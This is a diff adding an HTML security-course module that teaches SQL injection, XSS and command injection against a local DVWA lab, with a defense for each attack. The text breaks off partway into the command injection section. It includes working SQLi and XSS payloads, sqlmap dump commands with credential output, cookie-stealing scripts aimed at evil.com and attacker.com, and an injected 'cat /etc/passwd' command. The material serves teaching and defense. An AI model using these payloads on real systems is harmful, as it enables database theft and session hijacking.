@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🧱 Brick 18 — SEC-WEB01: Web Application Security</title>
+<style>
+:root{--p:#e91e63;--pl:#f8bbd0;--g:#2e7d32;--gl:#a5d6a7;--bg:#0a0a12;--s2:#1a1a2e;--tx:#e8e6f0;--t2:#a8a6b8;--mt:#6c6a7e;--bd:rgba(233,30,99,.18);--bdg:rgba(46,125,50,.2);--purple:#9c27b0;--mono:"Courier New",monospace;--dn:#ff5252;--sec:#ff6f00;--secl:#ffcc80;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:Calibri,"Segoe UI",sans-serif;background:var(--bg);color:var(--tx);font-size:11pt;line-height:1.65;padding:20px;}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse at 80% 30%,rgba(255,111,0,.04),transparent 50%);}
+.w{max-width:900px;margin:0 auto;position:relative;z-index:1;}
+h1{color:var(--p);font-size:20pt;margin:30px 0 12px;border-bottom:2px solid var(--p);padding-bottom:8px;}
+h2{color:var(--sec);font-size:15pt;margin:28px 0 10px;border-left:4px solid var(--sec);padding-left:12px;}
+h3{color:var(--p);font-size:12pt;margin:20px 0 8px;}
+p{margin:8px 0;text-align:justify;}
+.ic{font-family:var(--mono);font-size:9pt;background:rgba(255,111,0,.08);padding:1px 5px;border-radius:3px;color:var(--secl);}
+.note{background:var(--s2);border-left:3px solid var(--p);padding:12px;border-radius:0 8px 8px 0;margin:14px 0;font-size:9.5pt;}.note b{color:var(--p);}.note.gn{border-left-color:var(--g);}.note.gn b{color:var(--gl);}.note.dn{border-left-color:var(--dn);}.note.dn b{color:var(--dn);}.note.sec{border-left-color:var(--sec);}.note.sec b{color:var(--secl);}
+.tabs{display:flex;gap:2px;margin:14px 0 6px;}
+.tab{padding:5px 12px;border-radius:6px 6px 0 0;border:1px solid transparent;background:none;color:var(--mt);cursor:pointer;font-size:8.5pt;font-family:inherit;}.tab.on{background:var(--s2);color:var(--sec);border-color:rgba(255,111,0,.2);border-bottom-color:var(--s2);}
+.pan{display:none;background:var(--s2);border:1px solid rgba(255,111,0,.15);border-radius:0 8px 8px 8px;padding:14px;font-size:10pt;}.pan.on{display:block;}.pan.si{border-left:3px solid var(--gl);}.pan.te{border-left:3px solid var(--sec);}.pan.de{border-left:3px solid var(--purple);}
+.cw{margin:10px 0;border:1px solid rgba(255,111,0,.15);border-radius:8px;overflow:hidden;background:#10101c;}
+.cwt{display:flex;justify-content:space-between;align-items:center;padding:3px 10px;background:rgba(255,111,0,.06);border-bottom:1px solid rgba(255,111,0,.15);font-size:7pt;}
+.cwl{color:var(--sec);font-family:var(--mono);font-weight:bold;text-transform:uppercase;letter-spacing:1px;}
+.cwb{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:var(--t2);padding:2px 7px;border-radius:4px;cursor:pointer;font-size:7pt;font-family:var(--mono);}.cwb:hover{background:var(--sec);color:#fff;}
+pre{font-family:var(--mono);font-size:9.5pt;padding:10px;overflow-x:auto;white-space:pre;line-height:1.5;margin:0;color:var(--tx);background:#10101c;}
+pre .c{color:#555;font-style:italic;}pre .g{color:#a5d6a7;}pre .y{color:#fff59d;}pre .b{color:#90caf9;}pre .o{color:#ffcc80;}pre .p{color:#f48fb1;}pre .v{color:#ce93d8;}pre .r{color:#ef9a9a;}
+.out{background:rgba(255,111,0,.04);border-top:2px solid var(--sec);padding:6px 10px;font-family:var(--mono);font-size:8.5pt;color:var(--secl);}
+.outl{color:var(--sec);font-weight:bold;font-size:7pt;text-transform:uppercase;letter-spacing:1px;margin-bottom:2px;}
+.cm{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0;}.cm>div{border-radius:8px;padding:10px;font-size:9pt;}
+.cm-do{background:rgba(46,125,50,.05);border:1px solid var(--bdg);}.cm-do b{color:var(--gl);}
+.cm-x{background:rgba(255,111,0,.04);border:1px solid rgba(255,111,0,.15);}.cm-x b{color:var(--secl);}
+.cm p{margin:3px 0;color:var(--t2);}
+.qz{background:var(--s2);border:1px solid rgba(255,111,0,.15);border-radius:8px;padding:12px;margin:12px 0;}.qz-q{color:var(--tx);font-size:10pt;margin-bottom:8px;}
+.qo{padding:7px 12px;border:1px solid var(--bd);border-radius:8px;cursor:pointer;font-size:9pt;color:var(--t2);background:none;font-family:inherit;width:100%;text-align:left;transition:all .15s;display:block;margin-bottom:5px;}.qo:hover:not(:disabled){border-color:var(--sec);color:var(--secl);}.qo.y{border-color:var(--g);background:rgba(46,125,50,.1);color:var(--gl);}.qo.n{border-color:var(--dn);background:rgba(255,82,82,.06);color:var(--dn);}
+.qfb{margin-top:6px;font-size:9pt;padding:8px;border-radius:6px;display:none;}.qfb.s{display:block;}.qfb.w{background:rgba(46,125,50,.08);color:var(--gl);border:1px solid var(--bdg);}.qfb.l{background:rgba(255,82,82,.05);color:var(--dn);border:1px solid rgba(255,82,82,.15);}
+.sd{margin:40px 0 0;padding:16px 0 8px;border-top:1px solid rgba(255,111,0,.1);}.sd small{color:var(--mt);font-size:8pt;text-transform:uppercase;letter-spacing:2px;}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:9.5pt;}
+th{background:rgba(255,111,0,.08);color:var(--secl);padding:8px 10px;text-align:left;border-bottom:2px solid var(--sec);}
+td{padding:6px 10px;border-bottom:1px solid var(--bd);color:var(--t2);}
+td code{font-family:var(--mono);font-size:9pt;color:var(--secl);background:rgba(255,111,0,.06);padding:1px 4px;border-radius:2px;}
+.atk{background:rgba(255,82,82,.04);border:1px solid rgba(255,82,82,.15);border-radius:10px;padding:16px;margin:16px 0;}.atk h3{color:var(--dn);margin-top:0;}.atk .ic{background:rgba(255,82,82,.1);color:#ef9a9a;}
+.def{background:rgba(46,125,50,.04);border:1px solid var(--bdg);border-radius:10px;padding:16px;margin:16px 0;}.def h3{color:var(--gl);margin-top:0;}
+.sf{position:fixed;bottom:14px;right:14px;z-index:9999;}.sf button{padding:8px 16px;background:var(--sec);color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:inherit;box-shadow:0 4px 14px rgba(0,0,0,.3);}
+.cover{text-align:center;padding:30px;margin-bottom:20px;background:linear-gradient(135deg,#1a0a00,#0d1b2a);border:2px solid var(--dn);border-radius:14px;position:relative;overflow:hidden;}.cover h1{border:none;color:#ef9a9a;font-size:16pt;margin:0;}.cover p{color:var(--t2);font-size:10pt;}.cover::after{content:'💉';position:absolute;font-size:80pt;opacity:0.04;right:10px;top:-10px;}
+@media print{body{background:#fff;color:#333;}h1{color:#e91e63!important;}h2{color:#ff6f00!important;}pre{background:#f5f5f5!important;color:#333;}.sf{display:none;}@page{size:A4;margin:1.5cm 1cm;}}
+</style>
+</head>
+<body>
+<div class="w">
+
+<div class="cover">
+<h1>🧱 Brick 18 — SEC-WEB01: Web Application Security</h1>
+<p>SQL injection, XSS, command injection — finding and exploiting real vulnerabilities in your lab</p>
+<p style="font-size:8pt;color:var(--mt);margin-top:6px;">🛡️ SECURITY Track · 7 sections · Hands-on exploitation against DVWA &amp; Juice Shop</p>
+</div>
+
+<div class="note sec">
+<b>🔥 The moment everything connects:</b> You built the system (Parts 1-4). You learned the shell (Bricks 1-8). You mastered the commands (Bricks 9-14). You learned to think like an attacker (Brick 15). You gathered intelligence (Brick 16). You scanned and fingerprinted services (Brick 17). Now you exploit what you found. This module teaches you how the most common web vulnerabilities work, how to find them, how to exploit them step by step, and — critically — how to defend against them. Every attack comes paired with its defense. You are learning both sides.
+</div>
+
+<div class="note dn">
+<b>⚠️ All exercises target YOUR Docker lab ONLY.</b> DVWA at <span class="ic">http://localhost:8081</span>, Juice Shop at <span class="ic">http://localhost:3000</span>, WebGoat at <span class="ic">http://localhost:8082</span>. Start them with <span class="ic">docker start dvwa juice-shop webgoat</span> before beginning. Set DVWA security level to "Low" for learning, then increase as you improve.
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 1: OWASP Top 10 Overview               -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s0"><small>SEC-WEB01.1 of 7 · ⏱ ~10 min</small></div>
+<h2>SEC-WEB01.1 — The OWASP Top 10: The Vulnerability Roadmap</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>The OWASP (Open Web Application Security Project) Top 10 is the most widely recognized classification of web application security risks. Updated every few years based on real-world data from thousands of organizations, it represents the vulnerabilities that are most commonly found and most frequently exploited in web applications worldwide. Think of it as the "most wanted list" of web security bugs. If you can find and fix these ten categories of vulnerabilities, you have addressed the vast majority of web application security risk.</p>
+<p>This module covers the four most hands-on, immediately exploitable categories through your Docker lab: <strong>Injection</strong> (SQL injection, command injection), <strong>Cross-Site Scripting (XSS)</strong>, <strong>Broken Access Control</strong> (including CSRF), and <strong>Security Misconfiguration</strong> (exposed admin panels, default credentials, directory listings). These four categories alone account for the majority of web application breaches.</p>
+</div>
+<div class="pan te" data-l="te">
+<p>The OWASP Top 10 (2021 edition): <strong>A01: Broken Access Control</strong> — users can act beyond their intended permissions (IDOR, privilege escalation, CSRF). <strong>A02: Cryptographic Failures</strong> — sensitive data exposed due to weak encryption or missing HTTPS. <strong>A03: Injection</strong> — untrusted input interpreted as commands (SQL injection, OS command injection, LDAP injection). <strong>A04: Insecure Design</strong> — fundamental design flaws that cannot be fixed by implementation (missing rate limiting, lack of input validation architecture). <strong>A05: Security Misconfiguration</strong> — default credentials, unnecessary features enabled, verbose error messages, missing security headers. <strong>A06: Vulnerable and Outdated Components</strong> — known-vulnerable libraries and frameworks (the Apache version nmap found in your lab). <strong>A07: Identification and Authentication Failures</strong> — weak passwords, missing MFA, session fixation. <strong>A08: Software and Data Integrity Failures</strong> — insecure CI/CD, unverified updates (supply chain attacks). <strong>A09: Security Logging and Monitoring Failures</strong> — attacks go undetected because logging is insufficient. <strong>A10: Server-Side Request Forgery (SSRF)</strong> — the server is tricked into making requests to internal resources. Your Docker lab covers A01, A03, A05, and A07 extensively through DVWA's challenge categories.</p>
+</div>
+
+<table>
+<tr><th>OWASP #</th><th>Category</th><th>Covered in This Module</th><th>Lab Target</th></tr>
+<tr><td>A03</td><td>Injection (SQLi, Command)</td><td><strong>Sections 2 &amp; 4</strong></td><td>DVWA, Juice Shop</td></tr>
+<tr><td>A07</td><td>XSS (Cross-Site Scripting)</td><td><strong>Section 3</strong></td><td>DVWA, Juice Shop</td></tr>
+<tr><td>A01</td><td>Broken Access (CSRF)</td><td><strong>Section 5</strong></td><td>DVWA</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td><td><strong>Section 6</strong></td><td>All three labs</td></tr>
+</table>
+
+<div class="qz"><div class="qz-q">🛡️ Why is "Injection" consistently ranked among the top web vulnerabilities decade after decade?</div>
+<div class="qo" onclick="ck(this,true)">Because the fundamental mistake — mixing user input with executable code/queries without proper separation — is easy to make, hard to detect through testing alone, and gives the attacker maximum impact (full database access, command execution, complete system compromise)</div>
+<div class="qo" onclick="ck(this,false)">Because web developers do not know about it</div>
+<div class="qo" onclick="ck(this,false)">Because there is no way to prevent it</div>
+<div class="qfb"></div></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 2: SQL Injection                       -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s1"><small>SEC-WEB01.2 of 7 · ⏱ ~18 min</small></div>
+<h2>SEC-WEB01.2 — SQL Injection: Breaking Into Databases</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+<button class="tab" onclick="sw(this,'de')">⚙️ Deep</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>SQL injection (SQLi) is the single most dangerous web vulnerability. It happens when a web application takes user input and pastes it directly into a database query without checking or escaping it. Imagine a librarian who takes your request and reads it aloud to the library system verbatim. If you request "Find me books by <em>Smith</em>", the system works normally. But if you request "Find me books by <em>Smith; now delete all records</em>", and the librarian reads the ENTIRE request to the system without thinking, the system deletes all records. That is SQL injection — your input stops being data and becomes a command.</p>
+<p>A successful SQL injection can let an attacker read the entire database (all usernames, passwords, credit cards, personal data), modify data (change passwords, promote their account to admin), delete data (drop tables, wipe records), or in some cases execute operating system commands through the database server. It is catastrophic, and it is shockingly common — even in 2026, new SQLi vulnerabilities are discovered in production applications daily.</p>
+</div>
+<div class="pan te" data-l="te">
+<p>Vulnerable code constructs an SQL query by concatenating user input: <span class="ic">query = "SELECT * FROM users WHERE id = '" + user_input + "'"</span>. If <span class="ic">user_input</span> is <span class="ic">1</span>, the query becomes <span class="ic">SELECT * FROM users WHERE id = '1'</span> — correct. If <span class="ic">user_input</span> is <span class="ic">1' OR '1'='1</span>, the query becomes <span class="ic">SELECT * FROM users WHERE id = '1' OR '1'='1'</span> — which is always true, returning ALL rows. The attacker has broken out of the data context (the quoted string) into the SQL command context. From there, <span class="ic">UNION SELECT</span> lets you read data from any table, <span class="ic">information_schema</span> reveals the database structure, and database-specific functions like <span class="ic">LOAD_FILE()</span> (MySQL) or <span class="ic">xp_cmdshell</span> (MSSQL) can interact with the file system or execute OS commands. SQLi types: <strong>In-band</strong> (results displayed in the page — easiest), <strong>Blind</strong> (no visible output, but behavior changes based on true/false conditions — extract data one bit at a time), <strong>Out-of-band</strong> (data exfiltrated through DNS or HTTP requests from the database server).</p>
+</div>
+<div class="pan de" data-l="de">
+<p>The root cause of SQL injection is a violation of the principle of least privilege at the syntactic level: user-supplied data is placed into a context where it can be interpreted as code. The parser for the SQL query language does not distinguish between the developer's intended query structure and the attacker's injected commands because they are presented as a single string. The fix is <strong>parameterized queries</strong> (prepared statements), which separate the query structure from the data at the protocol level. With prepared statements, the SQL parser compiles the query template first (with <span class="ic">?</span> placeholders), creating a fixed execution plan. User data is then sent in a separate protocol message and bound to the placeholders — it is NEVER parsed as SQL, regardless of its content. Even if the user supplies <span class="ic">'; DROP TABLE users; --</span>, the database treats the entire string as a literal value for the placeholder, not as SQL commands. This is fundamentally different from escaping (which tries to neutralize special characters but can be bypassed through encoding tricks, double-encoding, or parser inconsistencies). Parameterized queries are the ONLY reliable defense against SQL injection.</p>
+</div>
+
+<div class="atk">
+<h3>💉 Attack: Manual SQL Injection on DVWA (Low Security)</h3>
+<p>Open DVWA at <span class="ic">http://localhost:8081</span>. Login with <span class="ic">admin/password</span>. Go to <strong>DVWA Security</strong> and set to <strong>Low</strong>. Then navigate to <strong>SQL Injection</strong>.</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">sqli — step by step against dvwa</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ STEP 1: Test for SQLi (does the input affect the query?) ═══</span>
+<span class="c"># In DVWA's "User ID" field, enter:</span>
+<span class="r">1</span>
+<span class="c"># Result: shows user "admin" — normal behavior</span>
+
+<span class="c"># Now enter a single quote to break the SQL syntax:</span>
+<span class="r">1'</span>
+<span class="c"># Result: SQL error message! The quote broke the query.</span>
+<span class="c"># This confirms the input is vulnerable to SQL injection.</span>
+
+<span class="c"># ═══ STEP 2: Extract All Users (always-true condition) ═══</span>
+<span class="r">1' OR '1'='1</span>
+<span class="c"># The query becomes: SELECT ... WHERE id = '1' OR '1'='1'</span>
+<span class="c"># '1'='1' is always true → returns ALL rows in the users table</span>
+<span class="c"># Result: shows ALL users (admin, gordonb, 1337, pablo, smithy)</span>
+
+<span class="c"># ═══ STEP 3: Determine Number of Columns (for UNION attack) ═══</span>
+<span class="r">1' ORDER BY 1 -- -</span>
+<span class="c"># Works (no error) → at least 1 column</span>
+<span class="r">1' ORDER BY 2 -- -</span>
+<span class="c"># Works → at least 2 columns</span>
+<span class="r">1' ORDER BY 3 -- -</span>
+<span class="c"># Error! → only 2 columns. UNION needs exactly 2 columns.</span>
+
+<span class="c"># ═══ STEP 4: UNION SELECT — Read Data from Any Table ═══</span>
+<span class="r">1' UNION SELECT user, password FROM users -- -</span>
+<span class="c"># Dumps ALL usernames and password hashes from the users table!</span>
+<span class="c"># Result shows: admin/5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of "password")</span>
+
+<span class="c"># ═══ STEP 5: Discover Database Structure ═══</span>
+<span class="r">1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- -</span>
+<span class="c"># Lists every table and column in the current database</span>
+<span class="c"># This is how attackers find where sensitive data is stored</span>
+
+<span class="c"># ═══ STEP 6: Extract Specific Data ═══</span>
+<span class="r">1' UNION SELECT user, password FROM dvwa.users -- -</span>
+<span class="c"># Targeted extraction of credentials</span></pre>
+<div class="out"><div class="outl">What the attacker just achieved</div><pre>✗ Read ALL usernames from the database
+✗ Read ALL password hashes (crackable with hashcat/john)
+✗ Discovered the complete database schema
+✗ Could modify data (UPDATE), delete data (DELETE), or create admin accounts
+✗ All from a single text input field on a web page</pre></div></div>
+
+<div class="def">
+<h3>🛡️ Defense: How to Prevent SQL Injection</h3>
+<p>The ONLY reliable fix is <strong>parameterized queries</strong> (prepared statements). Never build SQL queries by concatenating strings. Here is the vulnerable code versus the fixed code:</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">php — vulnerable vs secure</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c">// ❌ VULNERABLE — user input concatenated into query</span>
+<span class="r">$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";</span>
+<span class="c">// If id = 1' OR '1'='1  → dumps ALL users</span>
+
+<span class="c">// ✅ SECURE — parameterized query (prepared statement)</span>
+<span class="g">$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</span>
+<span class="g">$stmt->execute([$_GET['id']]);</span>
+<span class="c">// If id = 1' OR '1'='1  → searches for literal string "1' OR '1'='1"</span>
+<span class="c">// The injected SQL is treated as DATA, never as CODE</span></pre></div>
+
+<div class="cw"><div class="cwt"><span class="cwl">bash — automated sqli with sqlmap</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ sqlmap — Automated SQL Injection (against YOUR DVWA only!) ═══</span>
+
+<span class="c"># Step 1: Get your DVWA session cookie (login first in browser, then)</span>
+<span class="c"># Open browser DevTools (F12) → Application → Cookies → copy PHPSESSID value</span>
+
+<span class="c"># Step 2: Run sqlmap against the vulnerable parameter</span>
+<span class="g">sqlmap</span> <span class="o">-u</span> <span class="y">"http://localhost:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> \
+    <span class="o">--cookie</span> <span class="y">"PHPSESSID=YOUR_SESSION_ID; security=low"</span> \
+    <span class="o">--dbs</span>
+<span class="c"># --dbs = enumerate databases</span>
+<span class="c"># sqlmap automatically detects the injection type and exploits it</span>
+
+<span class="c"># Step 3: Dump specific tables</span>
+<span class="g">sqlmap</span> <span class="o">-u</span> <span class="y">"http://localhost:8081/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> \
+    <span class="o">--cookie</span> <span class="y">"PHPSESSID=YOUR_SESSION_ID; security=low"</span> \
+    <span class="o">-D dvwa</span> <span class="o">-T users</span> <span class="o">--dump</span>
+<span class="c"># Dumps the entire users table including password hashes</span>
+<span class="c"># sqlmap even offers to crack the hashes with a dictionary attack!</span></pre>
+<div class="out"><div class="outl">sqlmap output (excerpt)</div><pre>[INFO] the back-end DBMS is MySQL
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+</pre></div></div>
+
+<div class="qz"><div class="qz-q">🛡️ A developer tells you "I escape all single quotes in user input, so my app is safe from SQL injection." Are they correct?</div>
+<div class="qo" onclick="ck(this,false)">Yes — escaping quotes prevents all SQL injection</div>
+<div class="qo" onclick="ck(this,true)">No — escaping can be bypassed through double-encoding, alternate encodings (UTF-8 tricks), numeric injection (no quotes needed for integer fields), or parser inconsistencies. Parameterized queries (prepared statements) are the ONLY reliable defense because they separate code from data at the protocol level.</div>
+<div class="qo" onclick="ck(this,false)">It depends on the database type</div>
+<div class="qfb"></div></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 3: Cross-Site Scripting (XSS)          -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s2"><small>SEC-WEB01.3 of 7 · ⏱ ~16 min</small></div>
+<h2>SEC-WEB01.3 — Cross-Site Scripting (XSS): Injecting JavaScript</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>Cross-Site Scripting (XSS) is the injection of malicious JavaScript into web pages viewed by other users. If SQL injection attacks the server's database, XSS attacks the user's browser. When an application takes user input and displays it back on a page without properly sanitizing it, an attacker can inject JavaScript code that runs in every user's browser when they view that page. This JavaScript can steal session cookies (hijacking their login), redirect them to phishing sites, modify the page content they see, capture their keystrokes, or perform actions on their behalf.</p>
+<p>There are three types. <strong>Reflected XSS</strong>: the malicious script is part of the URL or form submission and is immediately reflected back in the response — the victim must click a crafted link. <strong>Stored XSS</strong>: the malicious script is saved to the database (e.g., in a forum post, comment, or profile field) and displayed to every user who views that page — much more dangerous because it persists. <strong>DOM-based XSS</strong>: the vulnerability is in client-side JavaScript that processes URL parameters without sanitization, never sending the payload to the server.</p>
+</div>
+<div class="pan te" data-l="te">
+<p>XSS exploits the browser's trust model: the browser executes any JavaScript that comes from the page's origin, regardless of who actually wrote it. If an attacker can inject <span class="ic">&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</span> into a page, the browser executes it with the victim's session context, sending their authentication cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim. Defenses: (1) <strong>Output encoding</strong> — convert <span class="ic">&lt;</span> to <span class="ic">&amp;lt;</span>, <span class="ic">&gt;</span> to <span class="ic">&amp;gt;</span>, etc., before inserting user data into HTML (context-dependent — HTML, JavaScript, URL, and CSS each need different encoding). (2) <strong>Content Security Policy (CSP)</strong> — HTTP header that restricts which scripts the browser will execute (<span class="ic">Content-Security-Policy: script-src 'self'</span> blocks all inline scripts). (3) <strong>HTTPOnly cookies</strong> — the <span class="ic">HttpOnly</span> flag on session cookies prevents JavaScript from reading them (the nmap scan in Brick 17 found this flag missing on DVWA). (4) Modern frameworks (React, Angular, Vue) auto-escape output by default, dramatically reducing XSS risk — but developers can still bypass the protection with functions like <span class="ic">dangerouslySetInnerHTML</span>.</p>
+</div>
+
+<div class="atk">
+<h3>💉 Attack: XSS on DVWA (Low Security)</h3>
+<p>In DVWA, navigate to <strong>XSS (Reflected)</strong> and <strong>XSS (Stored)</strong>.</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">xss — step by step against dvwa</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ REFLECTED XSS (DVWA → XSS Reflected) ═══</span>
+
+<span class="c"># Step 1: Normal input</span>
+<span class="r">Mari</span>
+<span class="c"># Result: "Hello Mari" — normal</span>
+
+<span class="c"># Step 2: Test for XSS — inject a script tag</span>
+<span class="r">&lt;script&gt;alert('XSS!')&lt;/script&gt;</span>
+<span class="c"># Result: JavaScript alert box pops up! The input was not sanitized.</span>
+<span class="c"># The server reflected your input directly into the HTML.</span>
+
+<span class="c"># Step 3: Steal cookies (simulated — shows what an attacker would do)</span>
+<span class="r">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span class="c"># Result: shows your PHPSESSID cookie in the alert box</span>
+<span class="c"># A real attacker would send this to their server instead of alerting it</span>
+
+<span class="c"># Step 4: How a real attack URL would look (victim clicks this link):</span>
+<span class="c"># http://localhost:8081/vulnerabilities/xss_r/?name=</span>
+<span class="c">#   &lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</span>
+
+<span class="c"># ═══ STORED XSS (DVWA → XSS Stored) ═══</span>
+
+<span class="c"># In the "Name" field (limited to 10 chars — but we'll come back to this)</span>
+<span class="c"># In the "Message" field:</span>
+<span class="r">&lt;script&gt;alert('Stored XSS — every visitor sees this!')&lt;/script&gt;</span>
+<span class="c"># Submit. Now EVERY TIME anyone loads this page, the alert fires.</span>
+<span class="c"># The script was saved to the database and is served to all visitors.</span>
+<span class="c"># This is far more dangerous than reflected XSS because it persists.</span>
+
+<span class="c"># ═══ XSS without script tags (bypass basic filters) ═══</span>
+
+<span class="c"># Using event handlers instead of script tags:</span>
+<span class="r">&lt;img src=x onerror=alert('XSS')&gt;</span>
+<span class="r">&lt;svg onload=alert('XSS')&gt;</span>
+<span class="r">&lt;body onload=alert('XSS')&gt;</span>
+
+<span class="c"># These bypass filters that only look for &lt;script&gt; tags</span></pre>
+<div class="out"><div class="outl">Impact of stored XSS</div><pre>✗ Every user who visits the page runs the attacker's JavaScript
+✗ Session cookies can be stolen → account hijacking
+✗ Page content can be modified → phishing, defacement
+✗ Keystrokes can be captured → password theft
+✗ Actions can be performed as the victim → unauthorized transactions
+✗ The attack persists in the database until manually removed</pre></div></div>
+
+<div class="def">
+<h3>🛡️ Defense: How to Prevent XSS</h3>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">defense — xss prevention</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ 1. Output Encoding (escape HTML special characters) ═══</span>
+<span class="c"># PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</span>
+<span class="c"># Python: from markupsafe import escape; escape(input)</span>
+<span class="c"># JavaScript: textContent instead of innerHTML</span>
+<span class="c"># Converts &lt; to &amp;lt; and &gt; to &amp;gt; — the browser shows them as text, not tags</span>
+
+<span class="c"># ═══ 2. Content Security Policy (HTTP header) ═══</span>
+<span class="c"># Content-Security-Policy: default-src 'self'; script-src 'self'</span>
+<span class="c"># This tells the browser: only execute scripts from our own domain</span>
+<span class="c"># Inline scripts (including injected ones) are blocked</span>
+
+<span class="c"># ═══ 3. HttpOnly Cookies ═══</span>
+<span class="c"># Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict</span>
+<span class="c"># HttpOnly → JavaScript cannot read the cookie (blocks cookie theft)</span>
+<span class="c"># Secure → cookie only sent over HTTPS</span>
+<span class="c"># SameSite=Strict → cookie not sent with cross-site requests (blocks CSRF)</span>
+
+<span class="c"># ═══ 4. Modern Frameworks (React, Angular, Vue) ═══</span>
+<span class="c"># Auto-escape output by default</span>
+<span class="c"># React: {userInput} is auto-escaped; dangerouslySetInnerHTML is not</span>
+<span class="c"># NEVER use dangerouslySetInnerHTML with user input</span></pre></div>
+
+<div class="qz"><div class="qz-q">🛡️ The nmap scan from Brick 17 revealed that DVWA's PHPSESSID cookie is missing the HttpOnly flag. Why does this matter for XSS?</div>
+<div class="qo" onclick="ck(this,true)">Without HttpOnly, JavaScript can read the session cookie with document.cookie — meaning an XSS attack can steal the session cookie and send it to the attacker, who can then impersonate the victim. HttpOnly prevents JavaScript from accessing the cookie at all.</div>
+<div class="qo" onclick="ck(this,false)">HttpOnly only affects performance, not security</div>
+<div class="qo" onclick="ck(this,false)">The cookie would still be stolen because HttpOnly only works with HTTPS</div>
+<div class="qfb"></div></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 4: Command Injection                   -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s3"><small>SEC-WEB01.4 of 7 · ⏱ ~12 min</small></div>
+<h2>SEC-WEB01.4 — Command Injection: Executing System Commands</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>Command injection is the most devastating web vulnerability — it lets an attacker run arbitrary operating system commands on the web server. If SQL injection gives access to the database, command injection gives access to the entire machine. It happens when a web application passes user input to a system command (like <span class="ic">ping</span>, <span class="ic">nslookup</span>, or <span class="ic">convert</span>) without sanitizing it. The attacker injects shell metacharacters (<span class="ic">;</span>, <span class="ic">|</span>, <span class="ic">&&</span>, <span class="ic">$()</span>, backticks) to chain their own commands onto the legitimate one.</p>
+<p>Think of it like this: the application asks the server "ping this address for me" and passes along whatever address the user typed. If the user types <span class="ic">8.8.8.8; cat /etc/passwd</span>, the server runs <span class="ic">ping 8.8.8.8; cat /etc/passwd</span> — the semicolon ends the ping command and starts a new one that reads the password file. From there, an attacker can read files, create backdoors, download malware, pivot to other systems, or take complete control.</p>
+</div>
+<div class="pan te" data-l="te">
